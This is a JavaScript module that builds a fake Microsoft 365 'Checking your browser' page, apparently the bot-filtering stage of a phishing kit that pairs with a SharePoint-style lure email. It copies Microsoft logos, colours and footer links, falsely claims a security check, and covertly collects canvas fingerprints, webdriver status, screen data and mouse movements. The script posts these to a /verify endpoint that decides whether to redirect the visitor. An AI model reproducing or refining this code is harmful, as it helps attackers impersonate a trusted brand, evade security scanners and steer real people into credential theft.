/**
 * Returns the interstitial HTML styled as a Microsoft 365 document
 * verification page. Matches the visual language of the email template
 * (SharePoint-style file sharing, Microsoft blue #005a9e, Segoe UI font).
 *
 * Flow:
 * 1. Page loads with Microsoft branding + "Checking your browser..." spinner
 * 2. JS silently collects browser telemetry in background
 * 3. After 1.5s, transitions to "Verified" state + "View Document" button
 * 4. User clicks button (genuine isTrusted click)
 * 5. JS POSTs telemetry to /verify
 * 6. Worker responds with redirect URL
 */

export function getInterstitialHTML(pageTitle) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${pageTitle} - Microsoft 365</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}

body{
  font-family:"Segoe UI","Segoe UI Web (West European)",-apple-system,BlinkMacSystemFont,Roboto,"Helvetica Neue",sans-serif;
  background:#f3f2f1;
  min-height:100vh;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  color:#323130;
  -webkit-font-smoothing:antialiased;
}

/* Microsoft header bar */
.ms-header{
  position:fixed;
  top:0;left:0;right:0;
  height:48px;
  background:#fff;
  border-bottom:1px solid #e1dfdd;
  display:flex;
  align-items:center;
  padding:0 16px;
  z-index:10;
}
.ms-logo{display:flex;align-items:center;gap:8px}
.ms-logo svg{width:20px;height:20px}
.ms-logo span{
  font-size:15px;
  font-weight:600;
  color:#323130;
  letter-spacing:-.2px;
}

/* Main card */
.card{
  background:#fff;
  border-radius:6px;
  box-shadow:0 2px 4px rgba(0,0,0,.04),0 0.5px 1px rgba(0,0,0,.08);
  border:1px solid #e1dfdd;
  padding:44px 40px 36px;
  max-width:440px;
  width:90%;
  text-align:center;
}

/* Lock/shield icon area */
.icon-wrap{
  width:64px;height:64px;
  margin:0 auto 24px;
  background:#f3f2f1;
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
  transition:background .4s ease;
}
.icon-wrap.verified{background:#dff6dd}
.icon-wrap svg{width:28px;height:28px;transition:fill .4s ease}
.icon-wrap.verified svg path{fill:#107c10}

h1{
  font-size:20px;
  font-weight:600;
  color:#323130;
  margin-bottom:4px;
  line-height:28px;
}
.subtitle{
  font-size:14px;
  color:#605e5c;
  margin-bottom:24px;
  line-height:20px;
}

/* Spinner state */
.status-checking{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:10px;
  padding:14px 0 4px;
}
.ms-spinner{
  width:20px;height:20px;
  border:2.5px solid #e1dfdd;
  border-top-color:#0078d4;
  border-radius:50%;
  animation:spin .8s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}
.spinner-label{font-size:13px;color:#605e5c}

/* Verified + button state */
.status-ready{
  display:none;
  flex-direction:column;
  align-items:center;
  gap:16px;
  padding-top:8px;
}
.status-ready.show{display:flex}
@keyframes fadeUp{
  from{opacity:0;transform:translateY(6px)}
  to{opacity:1;transform:translateY(0)}
}

.verified-badge{
  display:flex;
  align-items:center;
  gap:6px;
  font-size:13px;
  color:#107c10;
  font-weight:500;
  opacity:0;
  transform:translateY(6px);
  transition:opacity .3s ease, transform .3s ease;
}
.verified-badge.show{opacity:1;transform:translateY(0)}
.verified-badge svg{width:16px;height:16px}

/* Microsoft-style primary button */
.ms-btn{
  display:inline-flex;
  align-items:center;
  justify-content:center;
  gap:8px;
  background:#0078d4;
  color:#fff;
  border:none;
  border-radius:4px;
  padding:0 20px;
  height:36px;
  font-size:14px;
  font-weight:600;
  font-family:inherit;
  cursor:pointer;
  min-width:160px;
  outline:none;
  opacity:0;
  transform:translateY(6px);
  transition:opacity .3s ease, transform .3s ease, background .1s ease;
}
.ms-btn.show{opacity:1;transform:translateY(0)}
.ms-btn:hover{background:#106ebe}
.ms-btn:active{background:#005a9e}
.ms-btn:disabled{background:#c8c8c8;cursor:default}
.ms-btn .btn-spin{
  width:14px;height:14px;
  border:2px solid rgba(255,255,255,.35);
  border-top-color:#fff;
  border-radius:50%;
  animation:spin .7s linear infinite;
}

/* Footer */
.ms-footer{
  margin-top:28px;
  font-size:11px;
  color:#a19f9d;
  line-height:16px;
}
.ms-footer a{color:#a19f9d;text-decoration:none}
.ms-footer a:hover{text-decoration:underline}
.ms-footer .sep{margin:0 4px}

/* Info bar under card */
.info-bar{
  display:flex;
  align-items:center;
  gap:6px;
  margin-top:16px;
  font-size:11px;
  color:#605e5c;
}
.info-bar svg{width:14px;height:14px;flex-shrink:0}
</style>
</head>
<body>

<!-- Microsoft header -->
<div class="ms-header">
  <div class="ms-logo">
    <svg viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
      <rect x="0" y="0" width="10" height="10" fill="#f25022"/>
      <rect x="11" y="0" width="10" height="10" fill="#7fba00"/>
      <rect x="0" y="11" width="10" height="10" fill="#00a4ef"/>
      <rect x="11" y="11" width="10" height="10" fill="#ffb900"/>
    </svg>
    <span>Microsoft</span>
  </div>
</div>

<!-- Main verification card -->
<div class="card">
  <div class="icon-wrap" id="iconWrap">
    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM15.1 8H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z" fill="#0078d4"/>
    </svg>
  </div>
  <h1>Checking your browser</h1>
  <p class="subtitle">Performing a quick security check before opening this document.</p>

  <div class="status-checking" id="statusChecking">
    <div class="ms-spinner"></div>
    <span class="spinner-label">Checking...</span>
  </div>

  <div class="status-ready" id="statusReady">
    <div class="verified-badge">
      <svg viewBox="0 0 16 16" fill="none"><path d="M8 1a7 7 0 110 14A7 7 0 018 1zm3.36 4.65a.5.5 0 00-.72 0L7 9.29 5.36 7.65a.5.5 0 00-.72.7l2 2a.5.5 0 00.72 0l4-4a.5.5 0 000-.7z" fill="#107c10"/></svg>
      Verification complete
    </div>
    <button class="ms-btn" id="viewBtn">View Document</button>
  </div>

  <div class="ms-footer">
    <a href="https://www.microsoft.com/en-us/legal/intellectualproperty/copyright" tabindex="-1">Terms of use</a>
    <span class="sep">|</span>
    <a href="https://privacy.microsoft.com/en-us/privacystatement" tabindex="-1">Privacy &amp; cookies</a>
  </div>
</div>

<div class="info-bar">
  <svg viewBox="0 0 16 16" fill="none"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm.5 10.5h-1v-1h1v1zm0-2h-1v-5h1v5z" fill="#a19f9d"/></svg>
  Microsoft uses this check to protect shared content.
</div>

<script>
(function(){
  var T={
    load:Date.now(),
    render:null,
    interactions:[],
    wd:navigator.webdriver||false,
    sw:screen.width,
    sh:screen.height,
    ww:window.innerWidth,
    wh:window.innerHeight,
    touch:'ontouchstart' in window,
    fp:null
  };

  // Canvas fingerprint
  try{
    var c=document.createElement('canvas');
    c.width=200;c.height=50;
    var x=c.getContext('2d');
    x.textBaseline='top';
    x.font='14px Arial';
    x.fillStyle='#f60';
    x.fillRect(50,0,100,50);
    x.fillStyle='#069';
    x.fillText('fp.check',2,15);
    x.fillStyle='rgba(102,204,0,.7)';
    x.fillText('fp.check',4,17);
    T.fp=c.toDataURL().slice(-50);
  }catch(e){T.fp='none'}

  // Track mouse movement
  document.addEventListener('mousemove',function(e){
    if(T.interactions.length<10){
      T.interactions.push({x:e.clientX,y:e.clientY,t:Date.now()});
    }
  });

  // Track touch events
  document.addEventListener('touchstart',function(e){
    if(T.interactions.length<10&&e.touches[0]){
      T.interactions.push({x:e.touches[0].clientX,y:e.touches[0].clientY,t:Date.now()});
    }
  });

  // Phase transition after 1.5s
  setTimeout(function(){
    document.getElementById('statusChecking').style.display='none';
    document.getElementById('iconWrap').classList.add('verified');
    var sr=document.getElementById('statusReady');
    sr.classList.add('show');

    // Stagger: badge first, button 250ms later
    setTimeout(function(){
      document.querySelector('.verified-badge').classList.add('show');
    },80);
    setTimeout(function(){
      document.getElementById('viewBtn').classList.add('show');
      T.render=Date.now();
    },300);

    document.getElementById('viewBtn').addEventListener('click',function(e){
      var btn=e.currentTarget;
      btn.disabled=true;
      btn.innerHTML='<span class="btn-spin"></span>Opening...';

      var payload={
        isTrusted:e.isTrusted,
        webdriver:T.wd,
        clickDelay:Date.now()-T.render,
        interactionCount:T.interactions.length,
        screenWidth:T.sw,
        screenHeight:T.sh,
        windowWidth:T.ww,
        windowHeight:T.wh,
        touchCapable:T.touch,
        fingerprint:T.fp
      };

      fetch('/verify',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify(payload)
      })
      .then(function(r){return r.json()})
      .then(function(d){
        if(d.redirect){window.location.replace(d.redirect)}
      })
      .catch(function(){
        btn.disabled=false;
        btn.textContent='View Document';
      });
    });
  },1500);
})();
</script>
</body>
</html>`;
}
